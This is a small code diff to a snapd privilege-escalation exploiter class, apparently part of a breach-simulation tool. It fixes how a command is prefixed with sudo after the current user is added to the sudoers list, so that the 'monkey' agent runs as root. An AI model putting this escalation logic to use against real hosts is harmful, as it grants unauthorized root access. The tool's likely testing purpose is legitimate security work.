@@ -219,6 +219,7 @@ class snapdExploiter(HostPrivExploiter):
         '''
         This function tries pe and if succeeds then we run the command 
         '''
+        runMonkey = command
         # get the current user name
         whoami = os.popen('whoami').read()[:-1]
         LOG.info("Adding the current user %s to the sudoers list",whoami)
@@ -248,7 +249,7 @@ class snapdExploiter(HostPrivExploiter):
         LOG.info("The command that is executed as root is %s" % command)
         # now run the monkey as root
 
-        command = "sudo " + command
+        command = "sudo " + runMonkey
         monkey_process = subprocess.Popen(command, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
